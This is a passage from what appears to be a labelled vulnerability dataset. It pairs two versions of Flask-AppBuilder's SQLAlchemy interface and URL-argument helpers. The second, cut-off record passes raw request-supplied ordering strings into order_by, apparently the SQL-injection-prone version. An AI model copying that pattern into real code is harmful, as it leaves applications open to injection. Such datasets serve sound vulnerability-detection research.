'':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(\"%s %s\" % (order_column, order_direction))\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n/n/n/nflask_appbuilder/urltools.py/n/nimport re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if re_match:\n            order_direction = request.args.get('_od_' + re_match[0])\n            if order_direction in ('asc', 'desc'):\n                orders[re_match[0]] = (request.args.get(arg), order_direction)\n    return orders\n\n\ndef get_filter_args(filters):\n    filters.clear_filters()\n    for arg in request.args:\n        re_match = re.findall('_flt_(\\d)_(.*)', arg)\n        if re_match:\n            filters.add_filter_index(re_match[0][1], int(re_match[0][0]), request.args.get(arg))\n/n/n/n", "label": 0}, {"id": "2158db051408e0d66210a99b17c121be008e20b6", "code": "/flask_appbuilder/models/sqla/interface.py/n/n# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n                self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != '':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(order_column + ' ' + order_direction)\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        except:\n            return False\n\n    def is_string(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.String)\n        except:\n            return False\n\n    def is_text(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Text)\n        except:\n            return False\n\n    def is_integer(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Integer)\n        except:\n            return False\n\n    def is_numeric(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Numeric)\n        except:\n            return False\n\n    def is_float(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Float)\n        except:\n            return False\n\n    def is_boolean(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Boolean)\n        except:\n            return False\n\n    def is_date(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.Date)\n        except:\n            return False\n\n    def is_datetime(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, sa.types.DateTime)\n        except:\n            return False\n\n    def is_relation(self, col_name):\n        try:\n            return isinstance(self.list_properties[col_name], sa.orm.properties.RelationshipProperty)\n        except:\n            return False\n\n    def is_relation_many_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOONE'\n        except:\n            return False\n\n    def is_relation_many_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'MANYTOMANY'\n        except:\n            return False\n\n    def is_relation_one_to_one(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOONE'\n        except:\n            return False\n\n    def is_relation_one_to_many(self, col_name):\n        try:\n            if self.is_relation(col_name):\n                return self.list_properties[col_name].direction.name == 'ONETOMANY'\n        except:\n            return False\n\n    def is_nullable(self, col_name):\n        if self.is_relation_many_to_one(col_name):\n            col = self.get_relation_fk(col_name)\n            return col.nullable\n        try:\n            return self.list_columns[col_name].nullable\n        except:\n            return False\n\n    def is_unique(self, col_name):\n        try:\n            return self.list_columns[col_name].unique\n        except:\n            return False\n\n    def is_pk(self, col_name):\n        try:\n            return self.list_columns[col_name].primary_key\n        except:\n            return False\n\n    def is_fk(self, col_name):\n        try:\n            return self.list_columns[col_name].foreign_keys\n        except:\n            return False\n\n    def get_max_length(self, col_name):\n        try:\n            col = self.list_columns[col_name]\n            if col.type.length:\n                return col.type.length\n            else:\n                return -1\n        except:\n            return -1\n\n    \"\"\"\n    -------------------------------\n     FUNCTIONS FOR CRUD OPERATIONS\n    -------------------------------\n    \"\"\"\n\n    def add(self, item):\n        try:\n            self.session.add(item)\n            self.session.commit()\n            self.message = (as_unicode(self.add_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.add_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_ADD_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_ADD_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def edit(self, item):\n        try:\n            self.session.merge(item)\n            self.session.commit()\n            self.message = (as_unicode(self.edit_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.edit_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_EDIT_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_EDIT_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete(self, item):\n        try:\n            self._delete_files(item)\n            self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    def delete_all(self, items):\n        try:\n            for item in items:\n                self._delete_files(item)\n                self.session.delete(item)\n            self.session.commit()\n            self.message = (as_unicode(self.delete_row_message), 'success')\n            return True\n        except IntegrityError as e:\n            self.message = (as_unicode(self.delete_integrity_error_message), 'warning')\n            log.warning(LOGMSG_WAR_DBI_DEL_INTEGRITY.format(str(e)))\n            self.session.rollback()\n            return False\n        except Exception as e:\n            self.message = (as_unicode(self.general_error_message + ' ' + str(sys.exc_info()[0])), 'danger')\n            log.exception(LOGMSG_ERR_DBI_DEL_GENERIC.format(str(e)))\n            self.session.rollback()\n            return False\n\n    \"\"\"\n    -----------------------\n     FILE HANDLING METHODS\n    -----------------------\n    \"\"\"\n\n    def _add_files(self, this_request, item):\n        fm = FileManager()\n        im = ImageManager()\n        for file_col in this_request.files:\n            if self.is_file(file_col):\n                fm.save_file(this_request.files[file_col], getattr(item, file_col))\n        for file_col in this_request.files:\n            if self.is_image(file_col):\n                im.save_file(this_request.files[file_col], getattr(item, file_col))\n\n    def _delete_files(self, item):\n        for file_col in self.get_file_column_list():\n            if self.is_file(file_col):\n                if getattr(item, file_col):\n                    fm = FileManager()\n                    fm.delete_file(getattr(item, file_col))\n        for file_col in self.get_image_column_list():\n            if self.is_image(file_col):\n                if getattr(item, file_col):\n                    im = ImageManager()\n                    im.delete_file(getattr(item, file_col))\n\n    \"\"\"\n    ------------------------------\n     FUNCTIONS FOR RELATED MODELS\n    ------------------------------\n    \"\"\"\n\n    def get_col_default(self, col_name):\n        default = getattr(self.list_columns[col_name], 'default', None)\n        if default is not None:\n            value = getattr(default, 'arg', None)\n            if value is not None:\n                if getattr(default, 'is_callable', False):\n                    return lambda: default.arg(None)\n                else:\n                    if not getattr(default, 'is_scalar', True):\n                        return None\n                return value\n\n    def get_related_model(self, col_name):\n        return self.list_properties[col_name].mapper.class_\n\n    def query_model_relation(self, col_name):\n        model = self.get_related_model(col_name)\n        return self.session.query(model).all()\n\n    def get_related_interface(self, col_name):\n        return self.__class__(self.get_related_model(col_name), self.session)\n\n    def get_related_obj(self, col_name, value):\n        rel_model = self.get_related_model(col_name)\n        return self.session.query(rel_model).get(value)\n\n    def get_related_fks(self, related_views):\n        return [view.datamodel.get_related_fk(self.obj) for view in related_views]\n\n    def get_related_fk(self, model):\n        for col_name in self.list_properties.keys():\n            if self.is_relation(col_name):\n                if model == self.get_related_model(col_name):\n                    return col_name\n\n    \"\"\"\n    ------------- \n     GET METHODS\n    -------------\n    \"\"\"\n\n    def get_columns_list(self):\n        \"\"\"\n            Returns all model's columns on SQLA properties\n        \"\"\"\n        return list(self.list_properties.keys())\n\n    def get_user_columns_list(self):\n        \"\"\"\n            Returns all model's columns except pk or fk\n        \"\"\"\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if (not self.is_pk(col_name)) and (not self.is_fk(col_name)):\n                ret_lst.append(col_name)\n        return ret_lst\n\n    # TODO get different solution, more integrated with filters\n    def get_search_columns_list(self):\n        ret_lst = list()\n        for col_name in self.get_columns_list():\n            if not self.is_relation(col_name):\n                tmp_prop = self.get_property_first_col(col_name).name\n                if (not self.is_pk(tmp_prop)) and \\\n                        (not self.is_fk(tmp_prop)) and \\\n                        (not self.is_image(col_name)) and \\\n                        (not self.is_file(col_name)) and \\\n                        (not self.is_boolean(col_name)):\n                    ret_lst.append(col_name)\n            else:\n                ret_lst.append(col_name)\n        return ret_lst\n\n    def get_order_columns_list(self, list_columns=None):\n        \"\"\"\n            Returns the columns that can be ordered\n\n            :param list_columns: optional list of columns name, if provided will\n                use this list only.\n        \"\"\"\n        ret_lst = list()\n        list_columns = list_columns or self.get_columns_list()\n        for col_name in list_columns:\n            if not self.is_relation(col_name):\n                if hasattr(self.obj, col_name):\n                    if (not hasattr(getattr(self.obj, col_name), '__call__') or\n                            hasattr(getattr(self.obj, col_name), '_col_name')):\n                        ret_lst.append(col_name)\n                else:\n                    ret_lst.append(col_name)\n        return ret_lst\n\n    def get_file_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, FileColumn)]\n\n    def get_image_column_list(self):\n        return [i.name for i in self.obj.__mapper__.columns if isinstance(i.type, ImageColumn)]\n\n    def get_property_first_col(self, col_name):\n        # support for only one col for pk and fk\n        return self.list_properties[col_name].columns[0]\n\n    def get_relation_fk(self, col_name):\n        # support for only one col for pk and fk\n        return list(self.list_properties[col_name].local_columns)[0]\n\n    def get(self, id, filters=None):\n        if filters:\n            query = query = self.session.query(self.obj)\n            _filters = filters.copy()\n            _filters.add_filter(self.get_pk_name(), self.FilterEqual, id)\n            query = self._get_base_query(query=query, filters=_filters)\n            return query.first()\n        return self.session.query(self.obj).get(id)\n\n    def get_pk_name(self):\n        for col_name in self.list_columns.keys():\n            if self.is_pk(col_name):\n                return col_name\n\n\n\"\"\"\n    For Retro-Compatibility\n\"\"\"\nSQLModel = SQLAInterface\n/n/n/n/flask_appbuilder/urltools.py/n/nimport re\nfrom flask import request\n\n\nclass Stack(object):\n    \"\"\"\n        Stack data structure will not insert\n        equal sequential data\n    \"\"\"\n    def __init__(self, list=None, size=5):\n        self.size = size\n        self.data = list or []\n\n    def push(self, item):\n        if self.data:\n            if item != self.data[len(self.data) - 1]:\n                self.data.append(item)\n        else:\n            self.data.append(item)\n        if len(self.data) > self.size:\n            self.data.pop(0)\n\n    def pop(self):\n        if len(self.data) == 0:\n            return None\n        return self.data.pop(len(self.data) - 1)\n\n    def to_json(self):\n        return self.data\n\ndef get_group_by_args():\n    \"\"\"\n        Get page arguments for group by\n    \"\"\"\n    group_by = request.args.get('group_by')\n    if not group_by: group_by = ''\n    return group_by\n\ndef get_page_args():\n    \"\"\"\n        Get page arguments, returns a dictionary\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: page_<VIEW_NAME>=<PAGE_NUMBER>\n\n    \"\"\"\n    pages = {}\n    for arg in request.args:\n        re_match = re.findall('page_(.*)', arg)\n        if re_match:\n            pages[re_match[0]] = int(request.args.get(arg))\n    return pages\n\ndef get_page_size_args():\n    \"\"\"\n        Get page size arguments, returns an int\n        { <VIEW_NAME>: PAGE_NUMBER }\n\n        Arguments are passed: psize_<VIEW_NAME>=<PAGE_SIZE>\n\n    \"\"\"\n    page_sizes = {}\n    for arg in request.args:\n        re_match = re.findall('psize_(.*)', arg)\n        if re_match:\n            page_sizes[re_match[0]] = int(request.args.get(arg))\n    return page_sizes\n\ndef get_order_args():\n    \"\"\"\n        Get order arguments, return a dictionary\n        { <VIEW_NAME>: (ORDER_COL, ORDER_DIRECTION) }\n\n        Arguments are passed like: _oc_<VIEW_NAME>=<COL_NAME>&_od_<VIEW_NAME>='asc'|'desc'\n\n    \"\"\"\n    orders = {}\n    for arg in request.args:\n        re_match = re.findall('_oc_(.*)', arg)\n        if 